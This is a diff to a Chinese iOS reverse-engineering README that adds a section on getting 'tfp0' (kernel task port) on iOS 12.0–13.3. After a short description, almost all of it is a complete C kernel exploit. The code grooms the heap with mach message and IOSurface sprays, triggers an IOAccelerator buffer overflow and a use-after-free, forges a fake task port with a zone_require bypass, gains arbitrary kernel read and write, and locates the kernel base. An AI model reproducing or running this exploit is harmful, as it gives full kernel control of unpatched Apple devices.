@@ -7,6 +7,627 @@
 # 我的私人公众号: XLsn0w
 ![XLsn0w](https://github.com/XLsn0w/iOS-Reverse/blob/master/XLsn0w.jpeg?raw=true)
 
+# iOS 12.0-13.3 tfp0
+tfp0本质上是一种在内核内存中获取读写权限的方法，这是Apple极力尝试混淆的一种方法。
+由于操作系统从属于内核运行，因此可以越狱，从而实现系统范围的自定义。
+```
+int get_tfp0() {
+    void *data = NULL;
+    mach_port_t ports[200] = {};
+    mach_port_t new_tfp0 = MACH_PORT_NULL;
+    
+    int ret = init_offsets();
+    if (ret) {
+        printf("[-] iOS version not supported\n");
+        goto err;
+    }
+    printf("[*] Initialized offsets\n");
+    
+    ret = init_IOAccelerator();
+    if (ret) {
+        printf("[-] Failed to init IOAccelerator\n");
+        goto err;
+    }
+    printf("[*] Initialized IOAccelerator\n");
+    
+    ret = init_IOSurface();
+    if (ret) {
+        printf("[-] Failed to init IOSurface\n");;
+        goto err;
+    }
+    printf("[*] Initialized IOSurface\n");
+    
+    // setup 200 ports for later use
+    for (int i = 0; i < 200; i++) {
+        ports[i] = new_mach_port();
+    }
+    int port_i = 0;
+#define POP_PORT() ports[port_i++]
+        
+    
+    // ----------- heap pre-exploit setup ----------- //
+    
+    printf("[*] Doing stage 0 heap setup\n");
+
+    // ten thousand functions just for 20 lines of code bazad??
+    
+    // fill kalloc_map so new allocations are always done in kernel_map (where our buffer that will get overflowed is)
+    mach_port_t saved_ports[10];
+    mach_msg_size_t msg_size = message_size_for_kalloc_size(7 * pagesize) - sizeof(struct simple_msg);
+    data = calloc(1, msg_size);
+    size_t stage0_sz = pagesize == 0x4000 ? 10 MB : 5 MB;
+    for (int i = 0; i < 10; i++) {
+        saved_ports[i] = POP_PORT();
+        for (int j = 0; j < stage0_sz / (7 * pagesize); j++) {
+            kern_return_t ret = send_message(saved_ports[i], data, msg_size);
+            if (ret) {
+                printf("[-] Failed to send message\n");
+                goto err;
+            }
+        }
+    }
+    
+    free(data);
+    data = NULL;
+    
+    // we'll never do allocations smaller than 8 pages, so create some 7 page holes so the system can do small allocations there and leave us in peace
+    mach_port_destroy(mach_task_self(), saved_ports[0]);
+    mach_port_destroy(mach_task_self(), saved_ports[2]);
+    mach_port_destroy(mach_task_self(), saved_ports[4]);
+    mach_port_destroy(mach_task_self(), saved_ports[5]);
+    mach_port_destroy(mach_task_self(), saved_ports[7]);
+    mach_port_destroy(mach_task_self(), saved_ports[9]);
+    
+    // make a bunch of 8 page allocations to ensure there are no holes that mess with our allocations
+    mach_port_t spray = POP_PORT();
+    msg_size = message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg);
+    data = calloc(1, msg_size);
+    for (int i = 0; i < MACH_PORT_QLIMIT_LARGE; i++) {
+        kern_return_t ret = send_message(spray, data, msg_size);
+        if (ret) {
+            printf("[-] Failed to send message\n");
+            goto err;
+        }
+    }
+   
+    // ----------- heap stage 1 setup -----------//
+    
+    printf("[*] Doing stage 1 heap setup\n");
+    
+    int property_index = 0;
+    uint32_t huge_kalloc_key = transpose(property_index++);
+    ret = IOSurface_empty_kalloc(82 MB, huge_kalloc_key);
+    if (ret) {
+        printf("[-] Failed to allocate empty kalloc buffer\n");
+        goto err;
+    }
+    
+    // setup the buffers that we'll overflow
+    struct IOAccelDeviceShmemData cmdbuf, seglist;
+    ret = alloc_shmem(96 MB, &cmdbuf, &seglist);
+    if (ret) {
+        printf("[-] Failed to allocate shared memory\n");
+        goto err;
+    }
+    
+    // heap now:
+    // ------------------+------------------+------------------+----------------
+    //     huge kalloc   |   segment list   |  command buffer  |
+    // ------------------+------------------+------------------+----------------
+    //
+    
+    // port which we will later corrupt. should be exactly after command buffer
+    mach_port_t corrupted_kmsg_port = POP_PORT();
+    ret = send_message(corrupted_kmsg_port, data, (uint32_t)message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg));
+    if (ret) {
+        printf("[-] Failed to send message\n");
+        goto err;
+    }
+    
+    // now:
+    // ------------------+------------------+------------------+-----------------+-----------
+    //     huge kalloc   |   segment list   |  command buffer  | struct ipc_kmsg |
+    // ------------------+------------------+------------------+-----------------+-----------
+    //
+    
+    // this is a placeholder, we need it allocated for now but later it'll be freed and allocated with controlled data which will be UAFd
+    mach_port_t placeholder_message_port = POP_PORT();
+    ret = send_message(placeholder_message_port, data, (uint32_t)message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg));
+    if (ret) {
+        printf("[-] Failed to send message\n");
+        goto err;
+    }
+    
+    // allocate ool buffer which we'll also UAF
+    mach_port_t ool_message_port = POP_PORT();
+    int ool_ports_count = (7 * pagesize) / sizeof(uint64_t) + 1;
+    ret = send_ool_ports(ool_message_port, MACH_PORT_NULL, ool_ports_count, MACH_MSG_TYPE_COPY_SEND);
+    if (ret) {
+        printf("[-] Failed to send ool ports message\n");
+        goto err;
+    }
+    
+    // now:
+    // ------------------+------------------+------------------+-----------------+-------------------+-----------+
+    //     huge kalloc   |   segment list   |  command buffer  | struct ipc_kmsg | struct ipc_kmsg 2 | ool ports |
+    // ------------------+------------------+------------------+-----------------+-------------------+-----------+
+    //
+    
+    // free huge allocation
+    ret = IOSurface_remove_property(huge_kalloc_key);
+    if (ret) {
+        printf("[-] Failed to remove IOSurface property\n");
+        goto err;
+    }
+    
+    // now:
+    // ------------+------------------+------------------+-----------------+-------------------+-----------+
+    //     free    |   segment list   |  command buffer  | struct ipc_kmsg | struct ipc_kmsg 2 | ool ports |
+    // ------------+------------------+------------------+-----------------+-------------------+-----------+
+    //
+    
+    void *spray_buffer = ((uint8_t *) cmdbuf.data) + pagesize;
+
+    uint32_t kfree_buffer_key = transpose(property_index++);
+    memset(spray_buffer, 0x42, 8 * pagesize); // we'll need later in clean up to check if memory is still allocated
+    ret = IOSurface_kmem_alloc_spray(spray_buffer, 8 * pagesize, 80 MB / (8 * pagesize), kfree_buffer_key);
+    if (ret) {
+        printf("[-] Failed to spray\n");
+        goto err;
+    }
+    
+    mach_port_destroy(mach_task_self(), placeholder_message_port);
+    
+    // now:
+    // +------------------+------------------+-----------------+--------+-----------+--------------+
+    // |   segment list   |  command buffer  | struct ipc_kmsg |  free  | ool ports | kfree_buffer |
+    // +------------------+------------------+-----------------+--------+-----------+--------------+
+    //
+    
+    uint32_t spray_key = transpose(property_index++);
+    ret = IOSurface_kmem_alloc_spray(spray_buffer, 8 * pagesize, 80 MB / (8 * pagesize), spray_key);
+    if (ret) {
+        printf("[-] Failed to spray\n");
+        goto err;
+    }
+    
+    // now:
+    // +------------------+------------------+-----------------+--------------+-----------+--------------+
+    // |   segment list   |  command buffer  | struct ipc_kmsg | spray_buffer | ool_ports | kfree_buffer |
+    // +------------------+------------------+-----------------+--------------+-----------+--------------+
+    //
+    
+    size_t minimum_corrupted_size = 3 * (8 * pagesize) - 0x58; // 0x5ffa8 on 16K and 0x17fa8 on 4K
+    
+retry:;
+    int overflow_size = 0;
+    uint64_t ts = mach_absolute_time();
+    if (minimum_corrupted_size < ts && ts <= ((minimum_corrupted_size << 8) | 0xff)) {
+        overflow_size = 8;
+    }
+    else if (((minimum_corrupted_size << 8) | 0xff) < ts && ts <= ((minimum_corrupted_size << 16) | 0xffff)) {
+        overflow_size = 7;
+    }
+    else if (((minimum_corrupted_size << 16) | 0xffff) < ts && ts <= ((minimum_corrupted_size << 24) | 0xffffff)) {
+        overflow_size = 6;
+    }
+    else if (((minimum_corrupted_size << 24) | 0xffffff) < ts && ts <= ((minimum_corrupted_size << 32) | 0xffffffff)) {
+        overflow_size = 5;
+    }
+    else if (((minimum_corrupted_size << 32) | 0xffffffff) < ts && ts <= ((minimum_corrupted_size << 36) | 0xffffffffff)) {
+        overflow_size = 4;
+    }
+    else if (((minimum_corrupted_size << 36) | 0xffffffffff) < ts && ts <= ((minimum_corrupted_size << 40) | 0xffffffffffff)) {
+        overflow_size = 3;
+    }
+    
+    uint32_t ipc_kmsg_size = (uint32_t) (ts >> (8 * (8 - overflow_size)));
+    if (ipc_kmsg_size < (minimum_corrupted_size + 1) || ipc_kmsg_size > 0x0400a8ff) {
+        printf("[-] Probably won't work with this timestamp, retrying...\n");
+        usleep(100);
+        goto retry;
+    }
+    
+    printf("[*] Triggering bug with %d bytes\n", overflow_size);
+    overflow_n_bytes(96 MB, overflow_size, &cmdbuf, &seglist);
+    printf("[*] Corruption worked?\n");
+
+    mach_port_destroy(mach_task_self(), corrupted_kmsg_port);
+    printf("[*] Freed kmsg\n");
+    
+    mach_port_t message_leaking_port = POP_PORT();
+    
+    // now:
+    // +------------------+------------------+------+------+------+------+----------------------+
+    // |   segment list   |  command buffer  | free | free | free | free | part of kfree_buffer |
+    // +------------------+------------------+------+------+------+------+----------------------+
+    //
+    
+    for (int i = 0; i < 1024; i++) {
+        ret = send_message(message_leaking_port, data, (uint32_t)message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg));
+        if (ret) {
+            printf("[-] Failed to send message\n");
+            goto err;
+        }
+    }
+    
+    mach_port_t message_leaking_port_2 = MACH_PORT_NULL;
+    if (pagesize == 0x1000) {
+        message_leaking_port_2 = POP_PORT();
+        for (int i = 0; i < 1024; i++) {
+            ret = send_message(message_leaking_port_2, data, (uint32_t)message_size_for_kalloc_size(8 * pagesize) - sizeof(struct simple_msg));
+            if (ret) {
+                printf("[-] Failed to send message\n");
+                goto err;
+            }
+        }
+    }
+    
+    // now:
+    // +------------------+------------------+----------+----------+----------+----------+----------------------+
+    // |   segment list   |  command buffer  | ipc_kmsg | ipc_kmsg | ipc_kmsg | ipc_kmsg | part of kfree_buffer |
+    // +------------------+------------------+----------+----------+----------+----------+----------------------+
+    //
+    
+    free(data);
+    data = NULL;
+    
+    uint32_t argsSz = sizeof(struct IOSurfaceValueArgs) + 2 * sizeof(uint32_t);
+    struct IOSurfaceValueArgs *in = malloc(argsSz);
+    bzero(in, argsSz);
+    in->surface_id = IOSurface_ID;
+    in->binary[0] = spray_key;
+    in->binary[1] = 0;
+    
+    // this buffer is now an ipc_kmsg struct, read it back
+    size_t out_size = 82 MB; // make it bigger than actual; that works for both cases
+    ret = IOSurface_getValue(in, 16, spray_buffer, &out_size);
+    if (ret) {
+        printf("[-] Failed to read back value\n");
+        goto err;
+    }
+    
+    free(in);
+    
+    uint32_t ikm_size = 8 * (uint32_t)pagesize - 0x58;
+    void *ipc_kmsg = memmem(spray_buffer, out_size, &ikm_size, sizeof(ikm_size));
+    if (!ipc_kmsg) {
+        printf("[-] Failed to leak ipc_kmsg\n");
+        goto err;
+    }
+    
+    // ikm_header = beginning of struct + something, we can use this to calculate the address of the shared memory buffer
+    uint64_t ikm_header = *(uint64_t*)(ipc_kmsg + 24);
+    uint64_t segment_list_addr = ikm_header - 96 MB - 96 MB - 8 * pagesize - 2 * pagesize - 0x28;
+    
+    printf("[+] ikm_header leak: 0x%llx\n", ikm_header);
+    printf("[+] Segment list calculated to be at: 0x%llx\n", segment_list_addr);
+    
+    uint64_t fake_port_page_addr = segment_list_addr + 96 MB; // = addr of command buffer
+    uint64_t fake_port_addr = fake_port_page_addr + 0x100;
+    
+    uint64_t fake_task_page_addr = segment_list_addr + pagesize + 96 MB; // = addr of command buffer + pagesize
+    uint64_t fake_task_addr = fake_task_page_addr + 0x100;
+    
+    data = malloc(8 * pagesize);
+    for (int i = 0; i < 8 * pagesize / 8; i++) {
+        ((uint64_t*)data)[i] = fake_port_addr;
+    }
+    
+    mach_port_destroy(mach_task_self(), message_leaking_port);
+    if (message_leaking_port_2) mach_port_destroy(mach_task_self(), message_leaking_port_2);
+    
+    // now:
+    // +------------------+------------------+------+------+------+------+----------------------+
+    // |   segment list   |  command buffer  | free | free | free | free | part of kfree_buffer |
+    // +------------------+------------------+------+------+------+------+----------------------+
+    //
+    
+    uint32_t ool_ports_realloc_key = transpose(property_index++);
+    ret = IOSurface_kmem_alloc_spray(data, 8 * pagesize, 1000, ool_ports_realloc_key);
+    if (ret) {
+        printf("[-] Failed to spray\n");
+        goto err;
+    }
+
+    // bazad's fix for a kernel data abort
+    make_buffer_readable_by_kernel(cmdbuf.data, 2);
+    memset(cmdbuf.data, 0, 2 * pagesize);
+    
+    // setup fake port & fake task
+    kport_t *fake_port = cmdbuf.data + 0x100;
+    ktask_t *fake_task = cmdbuf.data + pagesize + 0x100;
+        
+    uint8_t *fake_port_page = cmdbuf.data;
+    uint8_t *fake_task_page = cmdbuf.data + pagesize;
+
+    // zone_require bypass
+    *(fake_port_page + 0x16) = 42;
+#if __arm64e__
+    *(fake_task_page + 0x16) = 57;
+#else
+    *(fake_task_page + 0x16) = 58;
+#endif
+        
+    fake_port->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
+    fake_port->ip_references = 0xd00d;
+    fake_port->ip_lock.type = 0x11;
+    fake_port->ip_messages.port.receiver_name = 1;
+    fake_port->ip_messages.port.msgcount = 0;
+    fake_port->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
+    fake_port->ip_messages.port.waitq.flags = mach_port_waitq_flags();
+    fake_port->ip_srights = 99;
+    fake_port->ip_kobject = fake_task_addr;
+        
+    fake_task->ref_count = 0xff;
+    fake_task->lock.data = 0x0;
+    fake_task->lock.type = 0x22;
+    fake_task->ref_count = 100;
+    fake_task->active = 1;
+    
+    // receive back the fake ports
+    struct ool_msg *ool = (struct ool_msg *)receive_message(ool_message_port, sizeof(struct ool_msg) + 0x1000);
+    free(ool);
+    
+    mach_port_t fakeport = ((mach_port_t *)ool->ool_ports.address)[0];
+    if (!fakeport) {
+        printf("[-] Didn't get fakeport???\n");
+        goto err;
+    }
+    
+    printf("[+] fakeport: 0x%x\n", fakeport);
+    
+    // will use cuck00 until i figure out why MACH_MSG_TYPE_MOVE_RECEIVE triggers a zone_require panic
+    // why does this not work with mach_task_self()
+    uint64_t leaked_port_addr = find_port_via_cuck00(ool_message_port);
+    if (!leaked_port_addr) {
+        printf("[-] Failed to leak port address\n");
+        goto err;
+    }
+    printf("[+] Leaked port: 0x%llx\n", leaked_port_addr);
+
+    // ----------- kernel read ----------- //
+    
+    uint64_t *read_addr_ptr = (uint64_t *)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+    
+#define kr32(addr) rk32_via_fakeport(fakeport, read_addr_ptr, addr)
+#define kr64(addr) rk64_via_fakeport(fakeport, read_addr_ptr, addr)
+
+    uint64_t ipc_space = kr64(leaked_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
+    if (!ipc_space) {
+        printf("[-] Kernel read failed!\n");
+        goto err;
+    }
+    printf("[+] Got kernel read\n");
+    
+    uint64_t kernel_vm_map = 0;
+    uint64_t ipc_space_kernel = 0;
+    uint64_t our_port_addr = 0;
+    
+    uint64_t struct_task = kr64(ipc_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TASK));
+    our_port_addr = kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_ITK_SELF));
+    ipc_space_kernel = kr64(our_port_addr + offsetof(kport_t, ip_receiver));
+    
+    while (struct_task) {
+        uint64_t bsd_info = kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+
+        int pid = kr32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
+        if (pid == 0) {
+            kernel_vm_map = kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
+            break;
+        }
+        
+        struct_task = kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
+    }
+    
+    printf("[+] Our task port: 0x%llx\n", our_port_addr);
+    
+    // ----------- tfp0! ----------- //
+    
+    fake_port->ip_receiver = ipc_space_kernel;
+    *(uint64_t *)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = kernel_vm_map;
+    *(uint32_t *)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_ITK_SELF)) = 1;
+    
+    printf("[+] Updated port for tfp0!\n");
+    
+    init_kernel_memory(fakeport, our_port_addr);
+    
+    uint64_t addr = kalloc(8);
+    if (!addr) {
+        printf("[-] Seems like tfp0 port didn't work?\n");
+        goto err;
+    }
+    
+    printf("[*] Allocated: 0x%llx\n", addr);
+    wk64(addr, 0x4141414141414141);
+    uint64_t readb = rk64(addr);
+    kfree(addr, 8);
+    printf("[*] Read back: 0x%llx\n", readb);
+    
+    if (readb != 0x4141414141414141) {
+        printf("[-] Read back value didn't match\n");
+        goto err;
+    }
+    
+    printf("[*] Creating safer port\n");
+    
+    new_tfp0 = POP_PORT();
+    if (!new_tfp0) {
+        printf("[-] Failed to allocate new tfp0 port\n");
+        goto err;
+    }
+    
+    uint64_t new_addr = find_port(new_tfp0);
+    if (!new_addr) {
+        printf("[-] Failed to find new tfp0 port address\n");
+        goto err;
+    }
+    
+    uint64_t faketask = kalloc(pagesize);
+    if (!faketask) {
+        printf("[-] Failed to kalloc faketask\n");
+        goto err;
+    }
+    
+    kwrite(faketask, fake_task_page, pagesize);
+    fake_port->ip_kobject = faketask + 0x100;
+    
+    kwrite(new_addr, (const void*)fake_port, sizeof(kport_t));
+    
+    printf("[*] Testing new tfp0 port\n");
+    
+    init_kernel_memory(new_tfp0, our_port_addr);
+    
+    addr = kalloc(8);
+    if (!addr) {
+        printf("[-] Seems like the new tfp0 port didn't work?\n");
+        goto err;
+    }
+    
+    printf("[+] tfp0: 0x%x\n", new_tfp0);
+    printf("[*] Allocated: 0x%llx\n", addr);
+    wk64(addr, 0x4141414141414141);
+    readb = rk64(addr);
+    kfree(addr, 8);
+    printf("[*] Read back: 0x%llx\n", readb);
+    
+    if (readb != 0x4141414141414141) {
+        printf("[-] Read back value didn't match\n");
+        goto err;
+    }
+    
+    // ----------- find kernel base ----------- //
+    
+    uint64_t IOSurface_port_addr = find_port(IOSurfaceRootUserClient);
+    uint64_t IOSurface_object = rk64(IOSurface_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    uint64_t vtable = rk64(IOSurface_object);
+    vtable |= 0xffffff8000000000; // in case it has PAC
+    uint64_t function = rk64(vtable + 8 * koffset(OFFSET_GETFI));
+    function |= 0xffffff8000000000; // this address is inside the kernel image
+    uint64_t page = trunc_page_kernel(function);
+   
+    while (true) {
+        if (rk64(page) == 0x0100000cfeedfacf && (rk64(page + 8) == 0x0000000200000000 || rk64(page + 8) == 0x0000000200000002)) {
+            kernel_base = page;
+            break;
+        }
+        page -= pagesize;
+    }
+    
+    printf("[*] Kernel base: 0x%llx\n", kernel_base);
+    
+    // ----------- clean up ----------- //
+
+    printf("[-] Cleaning up...\n");
+    uint64_t our_task_addr = rk64(our_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    uint64_t itk_space = rk64(our_task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
+    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+    
+    uint32_t port_index = fakeport >> 8;
+    const int sizeof_ipc_entry_t = 0x18;
+    
+    // remove references to the first tfp0 port which is located in the command buffer
+    wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, 0);
+    wk64(is_table + (port_index * sizeof_ipc_entry_t), 0);
+    fakeport = MACH_PORT_NULL;
+    
+    // remove our receive right of new_tfp0 to prevent it from dying on app exit
+    port_index = new_tfp0 >> 8;
+    uint32_t ie_bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8);
+    ie_bits &= ~MACH_PORT_TYPE_RECEIVE;
+    wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, ie_bits);
+    
+    // after this command buffer & segment list can be freed safely
+    
+    uint64_t spray_array = address_of_property_key(IOSurfaceRootUserClient, spray_key); // OSArray *
+    uint32_t count = OSArray_objectCount(spray_array);
+    for (int i = 0; i < count; i++) {
+        uint64_t object = OSArray_objectAtIndex(spray_array, i); // OSData *
+        uint64_t buffer = OSData_buffer(object);
+        if (buffer == segment_list_addr + 96 MB + 96 MB + 8 * pagesize) {
+            printf("[*] Found corrupted OSData buffer at 0x%llx\n", buffer);
+            OSData_setLength(object, 0); // null out the size, this buffer was freed & reallocated
+            break;
+        }
+    }
+    // now we should be able to free this
+    IOSurface_remove_property(spray_key);
+    
+    uint64_t ool_array = address_of_property_key(IOSurfaceRootUserClient, ool_ports_realloc_key); // OSArray *
+    count = OSArray_objectCount(ool_array);
+    for (int i = 0; i < count; i++) {
+        uint64_t object = OSArray_objectAtIndex(ool_array, i); // OSData *
+        uint64_t buffer = OSData_buffer(object);
+        if (buffer == segment_list_addr + 96 MB + 96 MB + 8 * pagesize + 8 * pagesize) {
+            printf("[*] Found corrupted OSData buffer at 0x%llx\n", buffer);
+            OSData_setLength(object, 0);
+            break;
+        }
+    }
+    IOSurface_remove_property(ool_ports_realloc_key);
+
+    // in here only part of the buffer got freed, we don't know how much so the solution is more complex.
+    // we need to check if each page is mapped and if so check if it was allocated by us and not freed and reallocated by the system.
+    // when we find a page allocated by us it is safe to assume there won't be more corrupted pages since the corruption is contiguous
+    uint64_t kfree_array = address_of_property_key(IOSurfaceRootUserClient, kfree_buffer_key); // OSArray *
+    count = OSArray_objectCount(kfree_array);
+    
+    uint64_t start_of_corruption = segment_list_addr + 96 MB + 96 MB + 8 * pagesize + 8 * pagesize + 8 * pagesize;
+    
+    for (int i = 0; i < count; i++) {
+        uint64_t object = OSArray_objectAtIndex(kfree_array, i); // OSData *
+        uint64_t buffer = OSData_buffer(object);
+    
+        if (buffer >= start_of_corruption) {
+            uint64_t page = 0;
+            
+            // 8 pages
+            for (int p = 0; p < 8; p++) {
+                page = buffer + p * pagesize;
+                
+                // if allocation doesn't work page is mapped, otherwise it's free
+                ret = mach_vm_allocate(new_tfp0, &page, pagesize, VM_FLAGS_FIXED); // reallocate at same address
+                if (ret) {
+                    uint64_t readval = rk64(page);
+                    if (readval == 0x4242424242424242) {
+                        printf("[*] Fixing corrupted OSData buffer at 0x%llx\n", buffer);
+                        
+                        // fix it
+                        OSData_setBuffer(object, page);
+                        OSData_setLength(object, 8 * pagesize - (uint32_t)(page - buffer));
+                        
+                        // if we find a non-corrupted buffer stop
+                        goto out;
+                    }
+                    else {
+                        printf("[*] Part of buffer reallocated by the system, keeping\n");
+                    }
+                }
+                else {
+                    kfree(page, pagesize); // was freed already, so keep it freed
+                }
+            }
+            
+            // if we've reached this point object is corrupted entirely
+            OSData_setLength(object, 0);
+        }
+    }
+    
+out:;
+    IOSurface_remove_property(kfree_buffer_key);
+    
+err:;
+    for (int i = 0; i < 200; i++) {
+        if (ports[i] && ports[i] != new_tfp0) mach_port_destroy(mach_task_self(), ports[i]);
+    }
+    
+    if (data) free(data);
+    term_IOAccelerator();
+    term_IOSurface();
+    return new_tfp0;
+}
+```
+
 ## rootless Jailbreak 4
 ```
 #import "ViewController.h"
